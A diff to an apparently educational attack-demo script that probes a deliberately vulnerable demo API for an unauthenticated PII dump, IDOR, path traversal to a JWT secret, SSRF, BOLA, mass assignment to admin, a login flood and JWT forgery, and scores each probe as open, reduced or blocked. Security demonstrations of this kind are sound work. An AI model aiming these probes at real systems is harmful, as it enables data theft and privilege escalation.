@@ -8,9 +8,16 @@
  *   1. Unauthenticated data theft (user dump / IDOR / search)
  *   2. Path traversal on /api/files (steals JWT_SECRET — the only secret theft)
  *   3. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
- *   4. Login flood / rate limiting (framework gap)
- *   5. Authn ≠ authz: login, BOLA, admin route, cross-user write, mass assignment
+ *   4. Authn ≠ authz: login, BOLA, admin route, cross-user write, mass assignment
+ *   5. Login flood / rate limiting (after the login, so a lockout cannot hide phase 4)
  *   6. Forged admin JWT (climax) — then [Enter] before the report
+ *
+ * Works against any VaultPay build (Express in server/, DaloyJS in server-daloy/).
+ * Every probe ends in one of three observed outcomes:
+ *   ✗ APP HOLE   the attack worked
+ *   ◐ REDUCED    the hole is still open but there was less to steal
+ *   ✓ BLOCKED    the server refused the probe
+ * The script only reports what it sees on the wire; it never assumes a framework.
  *
  * Dropped vs attack.mjs: the /api/debug/config beat in data theft (same secret
  * as the traversal) and the cloud-metadata (IMDS) probe (up to 8s of dead air,
@@ -30,6 +37,7 @@
  *   --skip-flood  skip concurrent login flood
  *   --gate=TOKEN  send X-VaultPay-Demo header
  *   --internal=URL base URL for SSRF stand-in
+ *   --label=NAME  name of the stack under attack (default: read from /api/health)
  */
 
 import { createHmac } from "node:crypto";
@@ -54,7 +62,10 @@ let gateToken = process.env.DEMO_GATE_TOKEN || "";
 let resetToken = process.env.DEMO_RESET_TOKEN || "";
 /** SSRF stand-in target the API can reach but the attacker cannot. */
 let internalService = process.env.INTERNAL_SERVICE_URL || "";
+/** Name of the stack under attack, shown in the banner and report. */
+let targetLabel = "";
 for (const a of rawArgs) {
+    if (a.startsWith("--label=")) targetLabel = a.slice("--label=".length);
     if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
     if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
     if (a.startsWith("--internal=")) internalService = a.slice("--internal=".length);
@@ -67,7 +78,7 @@ const showWire = !quiet && !projector;
 
 if (!targetArg) {
     console.error(
-        "Usage: node attackv2.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--reset] [--gate=TOKEN] [--internal=URL]"
+        "Usage: node attackv2.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--reset] [--gate=TOKEN] [--internal=URL] [--label=NAME]"
     );
     process.exit(2);
 }
@@ -144,6 +155,7 @@ ${c.red}${c.bold}╔════════════════════
 ╚══════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
     console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
+    if (targetLabel) console.log(`${c.bold}Stack${c.reset}    ${c.bold}${c.yellow}${targetLabel}${c.reset}`);
     console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
     console.log(
         `${c.bold}Claim${c.reset}    JWT authenticates signed claims.\n         Authorization and safe app behavior still need explicit controls.`
@@ -157,7 +169,7 @@ ${c.red}${c.bold}╔════════════════════
         );
     }
     console.log(
-        `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  kind: framework-gap | misconfig | app-code${c.reset}\n`
+        `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◐ REDUCED${c.reset}${c.dim}  ${c.green}✓ BLOCKED${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}\n`
     );
 }
 
@@ -191,6 +203,20 @@ function ok(msg) {
 
 function bad(msg) {
     console.log(`  ${c.red}✗ APP HOLE${c.reset}       ${msg}`);
+}
+
+/** The hole is still open, but the response carried less than the attack wanted. */
+function reduced(probe, msg) {
+    stolen.reduced.push(msg);
+    setOutcome(probe, "reduced", msg);
+    console.log(`  ${c.yellow}${c.bold}◐ REDUCED${c.reset}        ${msg}`);
+}
+
+/** The server refused the probe outright. */
+function blocked(probe, msg) {
+    stolen.blocked.push(msg);
+    setOutcome(probe, "blocked", msg);
+    console.log(`  ${c.green}${c.bold}✓ BLOCKED${c.reset}        ${msg}`);
 }
 
 function platform(msg) {
@@ -234,8 +260,11 @@ function scoreboard() {
     const med = by.MEDIUM || 0;
     const infoN = by.INFO || 0;
     if (projector) {
+        const defended =
+            (stolen.blocked.length ? ` · ${c.green}${stolen.blocked.length} blocked${c.reset}` : "") +
+            (stolen.reduced.length ? ` · ${c.yellow}${stolen.reduced.length} reduced${c.reset}` : "");
         console.log(
-            `  ── ${c.red}${crit} critical${c.reset} · ${c.yellow}${high} high${c.reset} · loot: users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}`
+            `  ── ${c.red}${crit} critical${c.reset} · ${c.yellow}${high} high${c.reset}${med ? ` · ${c.blue}${med} medium${c.reset}` : ""}${defended} · loot: users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}`
         );
         return;
     }
@@ -307,18 +336,27 @@ async function http(method, path, opts = {}) {
     const timer = setTimeout(() => ctrl.abort(), timeoutMs);
     const t0 = Date.now();
     try {
-        const res = await fetch(`${BASE}${path}`, {
-            method,
-            headers: {
-                Accept: "application/json, text/plain, */*",
-                ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
-                ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
-                ...headers,
-            },
-            body: payload,
-            redirect: "manual",
-            signal: ctrl.signal,
-        });
+        const send = () =>
+            fetch(`${BASE}${path}`, {
+                method,
+                headers: {
+                    Accept: "application/json, text/plain, */*",
+                    ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
+                    ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
+                    ...headers,
+                },
+                body: payload,
+                redirect: "manual",
+                signal: ctrl.signal,
+            });
+        let res;
+        try {
+            res = await send();
+        } catch (err) {
+            // One retry for a dropped keep-alive socket (e.g. after the server closed on a 413). Never for timeouts or writes.
+            if (method !== "GET" || err.name === "AbortError" || err.name === "TimeoutError") throw err;
+            res = await send();
+        }
         const text = await res.text();
         const ms = Date.now() - t0;
         let json = null;
@@ -395,7 +433,76 @@ const stolen = {
     escalated: false,
     findings: [],
     platformNotes: [],
+    /** Messages for probes that worked only partly / were refused. */
+    reduced: [],
+    blocked: [],
+    /** probe id → { state: "open"|"reduced"|"blocked"|"not-reached", severity?, note } */
+    outcomes: {},
 };
+
+/**
+ * One row per attack, in demo order. `npm run compare` prints these side by
+ * side for each target. A probe with no recorded outcome was not reached.
+ */
+const PROBES = [
+    ["user-dump", "User dump without a token (SSN/card/CVV)"],
+    ["idor", "Read any user by id without a token"],
+    ["search", "Unauthenticated PII search"],
+    ["traversal", "Path traversal to the secrets folder"],
+    ["ssrf", "SSRF: server fetches an internal URL"],
+    ["bola", "Read every user's orders with one login"],
+    ["admin", "Admin route with a non-admin token"],
+    ["cross-write", "Edit another user's record"],
+    ["mass-assign", "Mass-assign role=admin + balance"],
+    ["flood", "40 wrong passwords in one burst"],
+    ["forge", "Forge an admin JWT"],
+];
+
+function setOutcome(probe, state, note, severity) {
+    if (!probe) return;
+    const prev = stolen.outcomes[probe];
+    // "reduced" is sticky: a lower-severity finding recorded after it must not turn it back into "open".
+    if (prev?.state === "reduced" && state === "open") {
+        prev.severity = severity;
+        return;
+    }
+    stolen.outcomes[probe] = { state, note: note || "", ...(severity ? { severity } : {}) };
+}
+
+const SENSITIVE_FIELDS = ["ssn", "cardNumber", "cardCvv", "password", "passwordHash", "internalNote", "address"];
+
+/** Which sensitive fields are present in these response rows? Observation only. */
+function sensitiveFieldsIn(rows) {
+    const present = new Set();
+    for (const row of rows || []) {
+        for (const f of SENSITIVE_FIELDS) if (row && row[f] !== undefined && row[f] !== null) present.add(f);
+    }
+    return [...present];
+}
+
+/** Short reason a server gave for refusing a request ({error} or RFC 9457 problem+json). */
+function refusalReason(res) {
+    const j = res.json || {};
+    const first = Array.isArray(j.errors) && j.errors[0] ? j.errors[0].message : "";
+    const msg = first || j.error || j.detail || j.title || "";
+    return msg ? `: ${String(msg).replace(/\s+/g, " ").slice(0, 70)}` : "";
+}
+
+const isExpressTarget = () => /^express/i.test(targetLabel);
+
+/** Ask the target what it is (one quiet request) and fail early if it is down. */
+async function identifyTarget() {
+    try {
+        const h = await http("GET", "/api/health", { silent: true, timeoutMs: 6_000 });
+        if (targetLabel) return;
+        if (h.json?.framework) targetLabel = String(h.json.framework);
+        else if (h.json?.express) targetLabel = `Express ${h.json.express}`;
+    } catch (err) {
+        console.error(`\n  Cannot reach ${BASE} (${err.message}).`);
+        console.error("  Start the target first — e.g. `npm run server` (Express) or `npm run server:daloy`.\n");
+        process.exit(1);
+    }
+}
 
 function record(severity, title, detail, meta = {}) {
     const entry = {
@@ -408,6 +515,7 @@ function record(severity, title, detail, meta = {}) {
         source: meta.source || "app",
     };
     stolen.findings.push(entry);
+    setOutcome(meta.probe, "open", title, severity);
     finding(severity, title, entry);
     if (detail && !projector) info(detail);
     scoreboard();
@@ -435,7 +543,24 @@ async function phaseReset() {
         headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
     });
     if (res.status === 200 && res.json?.ok) {
-        ok("Demo DB re-seeded (Alice/Bob/admin clean)");
+        // Serverless hosts keep several warm instances, each with its own in-memory DB.
+        // One reset only cleans the instance that answered, so check and repeat.
+        let extra = 0;
+        for (; extra < 8; extra++) {
+            const check = await http("GET", "/api/users", { silent: true }).catch(() => null);
+            const seed = (check?.json?.users || []).filter((u) => u.id === 1 || u.id === 2);
+            const dirty = seed.some((u) => /^Hijacked/.test(u.name || "") || u.role === "admin");
+            if (!dirty) break;
+            await http("POST", "/api/demo/reset", {
+                silent: true,
+                headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
+            }).catch(() => null);
+        }
+        ok(
+            extra
+                ? `Demo DB re-seeded (Alice/Bob/admin clean; ${extra} extra reset(s) for other warm instances)`
+                : "Demo DB re-seeded (Alice/Bob/admin clean)"
+        );
     } else {
         info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
     }
@@ -452,53 +577,94 @@ async function phaseUnauthDataTheft() {
     const usersRes = await http("GET", "/api/users", { label: "user-dump" });
     if (usersRes.status === 200 && Array.isArray(usersRes.json?.users)) {
         stolen.users = usersRes.json.users;
-        bad(`Returned ${stolen.users.length} full accounts without auth`);
-        for (const u of stolen.users) {
-            loot(
-                `#${u.id} ${u.email}`,
-                `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
+        if (sensitiveFieldsIn(stolen.users).length) {
+            bad(`Returned ${stolen.users.length} full accounts without auth`);
+            for (const u of stolen.users) {
+                loot(
+                    `#${u.id} ${u.email}`,
+                    `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
+                );
+            }
+            record(
+                "CRITICAL",
+                "Unauthenticated user dump",
+                "No auth middleware on collection route — app left it public",
+                { kind: "app-code", owasp: "API5", probe: "user-dump" }
+            );
+        } else {
+            bad(`Returned ${stolen.users.length} accounts without auth — the route is still public`);
+            for (const u of stolen.users) {
+                loot(`#${u.id} ${u.email}`, `role=${u.role}  (fields: ${Object.keys(u).join(", ")})`);
+            }
+            reduced("user-dump", "No SSN, card number or CVV anywhere in the response");
+            record(
+                "MEDIUM",
+                "Unauthenticated user list (no sensitive fields)",
+                "Names, emails and roles are readable without a token; SSN / card / CVV are not in the response.",
+                { kind: "app-code", owasp: "API5", probe: "user-dump" }
             );
         }
-        record(
-            "CRITICAL",
-            "Unauthenticated user dump",
-            "No auth middleware on collection route — app left it public",
-            { kind: "app-code", owasp: "API5" }
-        );
     } else {
-        ok(`GET /api/users → ${usersRes.status}`);
+        blocked("user-dump", `GET /api/users without a token → ${usersRes.status}${refusalReason(usersRes)}`);
     }
 
     const id = stolen.users[0]?.id ?? 1;
     narrate(`IDOR (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
     const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
-    if (one.status === 200 && one.json?.user?.ssn) {
+    const oneUser = one.status === 200 ? one.json?.user : null;
+    if (oneUser && sensitiveFieldsIn([oneUser]).length) {
         bad(`Full record for user #${id} — just by changing the id`);
-        loot("SSN", one.json.user.ssn);
-        loot("card", one.json.user.cardNumber);
-        loot("CVV", one.json.user.cardCvv);
-        loot("note", one.json.user.internalNote);
+        loot("SSN", oneUser.ssn);
+        loot("card", oneUser.cardNumber);
+        loot("CVV", oneUser.cardCvv);
+        loot("note", oneUser.internalNote);
         record(
             "CRITICAL",
             "IDOR on /api/users/:id without auth",
             "Walk the id space — no auth, no ownership check",
-            { kind: "app-code", owasp: "API1" }
+            { kind: "app-code", owasp: "API1", probe: "idor" }
         );
+    } else if (oneUser) {
+        bad(`User #${id} readable by id without auth`);
+        reduced("idor", "No SSN, card, CVV or internal note in that record either");
+        record(
+            "MEDIUM",
+            "Unauthenticated read of any user by id (no sensitive fields)",
+            "Walk the id space — no auth, no ownership check; the response carries public profile fields only.",
+            { kind: "app-code", owasp: "API1", probe: "idor" }
+        );
+    } else {
+        blocked("idor", `GET /api/users/${id} without a token → ${one.status}${refusalReason(one)}`);
     }
 
     narrate('Searching PII with q="oslo"…');
     const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
-    if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
-        bad(`Search returned ${search.json.results.length} PII hits without auth`);
-        for (const r of search.json.results) {
+    const hits = search.status === 200 ? search.json?.results || [] : [];
+    if (hits.length > 0 && sensitiveFieldsIn(hits).length) {
+        bad(`Search returned ${hits.length} PII hits without auth`);
+        for (const r of hits) {
             loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
         }
         record(
             "HIGH",
             "Unauthenticated PII search",
             "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
-            { kind: "app-code", owasp: "API3" }
+            { kind: "app-code", owasp: "API3", probe: "search" }
         );
+    } else if (hits.length > 0) {
+        bad(`Search matched ${hits.length} users on a field it does not return — still no auth`);
+        for (const r of hits) loot(r.email, r.name);
+        reduced("search", "No address or SSN in the results — the match is only a yes/no oracle");
+        record(
+            "MEDIUM",
+            "Unauthenticated user search (no sensitive fields returned)",
+            "Search still filters on hidden fields, so it answers yes/no questions about them; the response carries public profile fields only.",
+            { kind: "app-code", owasp: "API5", probe: "search" }
+        );
+    } else if (search.status === 200) {
+        info("Search returned no results");
+    } else {
+        blocked("search", `GET /api/search without a token → ${search.status}${refusalReason(search)}`);
     }
 }
 
@@ -507,7 +673,7 @@ async function phaseUnauthDataTheft() {
  */
 async function phasePathTraversal() {
     step("Path traversal on /api/files (no login)");
-    intent("App file endpoint joins user input with no jail — not an Express default.");
+    intent("A file endpoint that takes a name from the query string. Can we climb out of the public folder?");
     narrate("First, read the intended public file…");
     const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
     if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
@@ -519,15 +685,18 @@ async function phasePathTraversal() {
     narrate("Now walk up directories into data/secrets/…");
     const attempts = ["../secrets/jwt-backup.txt", "..\\secrets\\jwt-backup.txt"];
     let hit = null;
+    const statuses = new Set();
     for (const t of attempts) {
         const res = await http("GET", `/api/files?name=${encodeURIComponent(t).replace(/%2F/gi, "/")}`, {
             label: `traverse:${t}`,
         });
+        statuses.add(res.status);
         if (res.status === 200 && /JWT_SECRET=/.test(res.text)) {
             hit = { t, body: res.text };
             break;
         }
         const res2 = await http("GET", `/api/files?name=${t}`, { label: `traverse-raw:${t}` });
+        statuses.add(res2.status);
         if (res2.status === 200 && /JWT_SECRET=/.test(res2.text)) {
             hit = { t, body: res2.text };
             break;
@@ -546,10 +715,10 @@ async function phasePathTraversal() {
             "CRITICAL",
             "Path traversal exposes virtual secret-file contents",
             "Demo in-memory VFS joins input without containment; no disk files were read. The hard-coded backup key may differ from the active signing key; JWT acceptance is tested separately.",
-            { kind: "app-code", cwe: "CWE-22" }
+            { kind: "app-code", cwe: "CWE-22", probe: "traversal" }
         );
     } else {
-        ok("Path traversal did not yield secrets (unexpected for this demo)");
+        blocked("traversal", `Every ../ attempt was refused (${[...statuses].join(" / ")}) — nothing outside the public folder`);
     }
 }
 
@@ -593,7 +762,7 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
             "HIGH",
             "SSRF fetches metadata stand-in credentials",
             `Fabricated credentials from the separate demo service, not real IAM credentials. Direct client fetch ${attackerReach ? "also succeeded; no private-network boundary demonstrated" : "failed; network isolation remains unconfirmed"}.`,
-            { kind: "app-code", owasp: "API7" }
+            { kind: "app-code", owasp: "API7", probe: "ssrf" }
         );
     } else {
         info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
@@ -621,7 +790,7 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
 async function phaseSsrfProxy() {
     step("Open proxy / SSRF on /api/proxy (no login)");
     intent(
-        "The server fetches any URL we hand it. Express has no egress policy — you must add one."
+        "The server fetches any URL we hand it. Does anything restrict where it will go?"
     );
     let proxyAlive = true;
     const loop = `${BASE}/api/debug/config`;
@@ -648,14 +817,18 @@ async function phaseSsrfProxy() {
             "CRITICAL",
             "SSRF proxy returns its public debug endpoint's secret",
             "Observed server-side self-fetch of the public BASE URL. This proves proxying the secret response, not access to an internal-only network destination.",
-            { kind: "app-code", owasp: "API7" }
+            { kind: "app-code", owasp: "API7", probe: "ssrf" }
         );
     } else if (res.status === 200) {
         bad(`Open proxy returned 200 for self-URL (body may vary)`);
         record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120), {
             kind: "app-code",
             owasp: "API7",
+            probe: "ssrf",
         });
+    } else if ([400, 403, 422].includes(res.status) && /ssrf|not allowed|refus|blocked|forbidden/i.test(res.text || "")) {
+        blocked("ssrf", `Proxy refused to fetch its own host (${res.status}${refusalReason(res)})`);
+        info("Only the internal destination was probed; public URLs were not tested in this run.");
     } else if (res.status === 404 && /error code:\s*1042/i.test(res.text || "")) {
         notePlatform(
             "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
@@ -674,7 +847,7 @@ async function phaseSsrfProxy() {
                 "HIGH",
                 "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                 "Self-target blocked by CF 1042; external target succeeded — open proxy, not a framework feature",
-                { kind: "app-code", owasp: "API7" }
+                { kind: "app-code", owasp: "API7", probe: "ssrf" }
             );
         } else {
             info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
@@ -696,7 +869,7 @@ async function phaseSsrfProxy() {
                 "HIGH",
                 "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                 "App /api/proxy with no allowlist",
-                { kind: "app-code", owasp: "API7" }
+                { kind: "app-code", owasp: "API7", probe: "ssrf" }
             );
         } else if (ext.status === 404) {
             proxyAlive = false;
@@ -715,7 +888,7 @@ async function phaseSsrfProxy() {
 async function phaseNoRateLimitFlood() {
     step("Login flood — observed authentication throttling");
     intent(
-        "Express core has no login rate limiter. One bounded batch of wrong passwords on one account."
+        "Does anything slow down password guessing? One bounded batch of wrong passwords on one account."
     );
     if (skipFlood) {
         info("Skipped (--skip-flood)");
@@ -752,16 +925,32 @@ async function phaseNoRateLimitFlood() {
         `  ${c.green}${c.bold}← RECV${c.reset}  flood batch  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
     );
 
-    if (got429 === 0 && got401 >= N * 0.7) {
+    const advertisedLimit = results
+        .map((r) => r.headers?.["x-ratelimit-limit"] || r.headers?.["ratelimit-limit"])
+        .find(Boolean);
+
+    if (got429 === 0 && got401 >= N * 0.7 && advertisedLimit) {
+        bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
+        reduced(
+            "flood",
+            `A general rate limit is advertised (${advertisedLimit} requests per window) — it caps volume, it is not a login throttle`
+        );
+        record(
+            "MEDIUM",
+            "No login-specific throttling; general rate limit only",
+            `${got401}/${N} wrong passwords accepted, zero 429. Response headers advertise a general limit of ${advertisedLimit} per window, which slows guessing but does not stop it.`,
+            { kind: "app-code", owasp: "API2", cwe: "CWE-307", probe: "flood" }
+        );
+    } else if (got429 === 0 && got401 >= N * 0.7) {
         bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
         record(
             "HIGH",
             "No authentication throttling observed in this batch",
             `${got401}/${N} concurrent attempts returned Incorrect password, zero 429. Does not prove absence of all lockouts, delays, or longer-window limits. Resource-abuse risks also relate to API4.`,
-            { kind: "framework-gap", owasp: "API2", cwe: "CWE-307" }
+            { kind: "framework-gap", owasp: "API2", cwe: "CWE-307", probe: "flood" }
         );
     } else if (got429 > 0) {
-        ok(`Server rate-limited some requests (${got429} × 429)`);
+        blocked("flood", `Throttled: ${got429}/${N} attempts answered 429 Too Many Requests`);
     } else {
         info(`Authentication throttle probe inconclusive: ${JSON.stringify(counted)}`);
     }
@@ -774,6 +963,7 @@ const DEMO_CREDENTIALS = [
 ];
 
 async function demoLogin() {
+    let throttled = false;
     for (const cred of DEMO_CREDENTIALS) {
         narrate(`Trying demo login ${cred.email}…`);
         const res = await http("POST", "/api/auth/login", {
@@ -783,8 +973,9 @@ async function demoLogin() {
         if (res.status === 200 && res.json?.token) {
             return { ...cred, token: res.json.token, user: res.json.user };
         }
+        if (res.status === 429) throttled = true;
     }
-    return null;
+    return throttled ? { throttled: true } : null;
 }
 
 /**
@@ -796,26 +987,30 @@ async function phaseAuthz() {
     intent("JWT proves someone logged in. It does not decide what they may read or write.");
 
     const loginOk = await demoLogin();
-    if (!loginOk) {
-        bad("Could not login with demo credentials — skipping authz chain");
+    if (!loginOk || loginOk.throttled) {
+        if (loginOk?.throttled) {
+            ok("Login answered 429 — this client is locked out, so no session to test with");
+            info("Authorization probes were not reached in this run. Restart the target (or wait for the lockout window) and re-run.");
+        } else {
+            bad("Could not login with demo credentials — skipping authz chain");
+        }
         return;
     }
     stolen.token = loginOk.token;
     stolen.loginUser = loginOk.user;
     ok(`Logged in as ${loginOk.email} (role=${loginOk.user.role})`);
     loot("token", loginOk.token);
+    const isAdminLogin = loginOk.user.role === "admin";
+    const auth = { Authorization: `Bearer ${stolen.token}` };
 
     narrate("Fetching /api/orders with this user JWT — server should scope to self…");
-    const orders = await http("GET", "/api/orders", {
-        headers: { Authorization: `Bearer ${stolen.token}` },
-        label: "bola-orders",
-    });
+    const orders = await http("GET", "/api/orders", { headers: auth, label: "bola-orders" });
     if (orders.status === 200 && Array.isArray(orders.json?.orders)) {
         stolen.orders = orders.json.orders;
         const others = new Set(
             stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
         );
-        if (others.size > 0 && loginOk.user.role !== "admin") {
+        if (others.size > 0 && !isAdminLogin) {
             bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users — BOLA (Broken Object Level Authorization)`);
             for (const o of stolen.orders.slice(0, 8)) {
                 loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
@@ -824,35 +1019,45 @@ async function phaseAuthz() {
                 "CRITICAL",
                 "BOLA on /api/orders",
                 "Authn present, authz missing — any login reads every order",
-                { kind: "app-code", owasp: "API1" }
+                { kind: "app-code", owasp: "API1", probe: "bola" }
             );
-        } else if (loginOk.user.role === "admin") {
+        } else if (isAdminLogin) {
             info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
         } else {
-            ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
+            blocked("bola", `Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
         }
+    } else {
+        blocked("bola", `GET /api/orders → ${orders.status}${refusalReason(orders)}`);
     }
 
-    const escToken = stolen.token;
     const escId = loginOk.user.id;
 
-    if (loginOk.user.role !== "admin") {
+    if (!isAdminLogin) {
         narrate("Hit /api/admin/stats before escalation with a non-admin identity...");
-        const stats = await http("GET", "/api/admin/stats", {
-            headers: { Authorization: `Bearer ${escToken}` },
-            label: "admin-stats",
-        });
-        if (stats.status === 200 && Array.isArray(stats.json?.accounts) && stats.json.accounts.length > 0) {
-            bad(`Admin dashboard open to a non-admin — BFLA (Broken Function Level Authorization) — ${stats.json.accounts.length} accounts`);
-            for (const account of stats.json.accounts.slice(0, 6)) {
-                loot(account.email, `password=${account.password} ssn=${account.ssn}`);
+        const stats = await http("GET", "/api/admin/stats", { headers: auth, label: "admin-stats" });
+        const accounts = Array.isArray(stats.json?.accounts) ? stats.json.accounts : [];
+        if (stats.status === 200 && accounts.length > 0) {
+            const leaksSecrets = sensitiveFieldsIn(accounts).length > 0;
+            bad(`Admin dashboard open to a non-admin — BFLA (Broken Function Level Authorization) — ${accounts.length} accounts`);
+            for (const account of accounts.slice(0, 6)) {
+                loot(
+                    account.email,
+                    leaksSecrets
+                        ? `password=${account.password} ssn=${account.ssn}`
+                        : `role=${account.role} balance=${account.balance}`
+                );
             }
+            if (!leaksSecrets) reduced("admin", "No passwords or SSNs in the admin response");
             record(
-                "CRITICAL",
+                leaksSecrets ? "CRITICAL" : "HIGH",
                 "Admin route accessible to a non-admin identity",
-                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA).",
-                { kind: "app-code", owasp: "API5" }
+                leaksSecrets
+                    ? "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA)."
+                    : "Observed before role mutation: a regular user's token reaches the admin route (BFLA); the response carries public profile fields only.",
+                { kind: "app-code", owasp: "API5", probe: "admin" }
             );
+        } else if (stats.status === 401 || stats.status === 403) {
+            blocked("admin", `Admin route refused a non-admin token (${stats.status}${refusalReason(stats)})`);
         } else {
             info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
         }
@@ -863,15 +1068,24 @@ async function phaseAuthz() {
     const victimId = escId === 2 ? 1 : 2;
     const victimName = victimId === 2 ? "Bob" : "Alice";
     narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (${victimName})…`);
-    const hijack = await http("PUT", `/api/users/${victimId}`, {
-        headers: { Authorization: `Bearer ${escToken}` },
+    let hijack = await http("PUT", `/api/users/${victimId}`, {
+        headers: auth,
         body: {
             internalNote: "cleared by attacker via cross-user PUT",
             name: `Hijacked ${victimName}`,
         },
         label: "cross-user-write",
     });
-    if (loginOk.user.role !== "admin" && hijack.status === 200 &&
+    if (hijack.status === 400 || hijack.status === 422) {
+        info(`Server rejected the internalNote field (${hijack.status}${refusalReason(hijack)})`);
+        narrate("Retrying with only a field the profile form is allowed to send (name)…");
+        hijack = await http("PUT", `/api/users/${victimId}`, {
+            headers: auth,
+            body: { name: `Hijacked ${victimName}` },
+            label: "cross-user-write-name",
+        });
+    }
+    if (!isAdminLogin && hijack.status === 200 &&
         hijack.json?.user?.id === victimId && hijack.json.user.name === `Hijacked ${victimName}`) {
         bad(`Rewrote user #${victimId} without ownership check`);
         loot("victim", JSON.stringify(hijack.json.user));
@@ -879,21 +1093,23 @@ async function phaseAuthz() {
             "CRITICAL",
             "Cross-user write without ownership check",
             "Before escalation, a regular user's token edited a different seed user's record without an ownership check.",
-            { kind: "app-code", owasp: "API1" }
+            { kind: "app-code", owasp: "API1", probe: "cross-write" }
         );
+    } else if ([401, 403, 404].includes(hijack.status)) {
+        blocked("cross-write", `Cross-user write refused (${hijack.status}${refusalReason(hijack)})`);
     } else {
         info(`Cross-user write → ${hijack.status}`);
     }
 
     narrate(`Mass-assign role=admin and balance on seed user #${escId} (${loginOk.email})...`);
     const escalate = await http("PUT", `/api/users/${escId}`, {
-        headers: { Authorization: `Bearer ${escToken}` },
+        headers: auth,
         body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
         label: "mass-assign-admin",
     });
-    if (loginOk.user.role !== "admin" && escalate.status === 200 && escalate.json?.user?.id === escId &&
+    if (!isAdminLogin && escalate.status === 200 && escalate.json?.user?.id === escId &&
         escalate.json.user.role === "admin" && escalate.json.user.balance === 1_000_000) {
-        stolen.escalated = loginOk.user.role !== "admin";
+        stolen.escalated = true;
         bad(`User #${escId} has role=admin and balance=${escalate.json.user.balance}`);
         loot("new-role", escalate.json.user.role);
         loot("new-balance", String(escalate.json.user.balance));
@@ -901,8 +1117,15 @@ async function phaseAuthz() {
             "CRITICAL",
             "Mass assignment privilege escalation",
             "No field allowlist on PUT body - app merged raw JSON into the user",
-            { kind: "app-code", owasp: "API3" }
+            { kind: "app-code", owasp: "API3", probe: "mass-assign" }
         );
+    } else if (!isAdminLogin && [400, 401, 403, 422].includes(escalate.status)) {
+        blocked("mass-assign", `role / balance write refused (${escalate.status}${refusalReason(escalate)})`);
+        const me = await http("GET", "/api/me", { headers: auth, label: "confirm-role" });
+        if (me.json?.user) info(`Confirmed: still role=${me.json.user.role}, balance=${me.json.user.balance}`);
+    } else if (!isAdminLogin && escalate.status === 200) {
+        const after = escalate.json?.user || {};
+        blocked("mass-assign", `Write accepted but role=${after.role}, balance=${after.balance} — privileged fields were ignored`);
     } else {
         info(`Mass assignment → ${escalate.status}`);
     }
@@ -913,7 +1136,7 @@ async function phaseAuthz() {
  */
 async function phaseForgery() {
     step("Forge an admin JWT with the stolen secret");
-    intent("The signature only proves who holds the key. We hold the key.");
+    intent("The signature only proves who holds the key. Do we hold the key?");
 
     narrate('Trying the classic "alg": "none" unsigned-token forgery…');
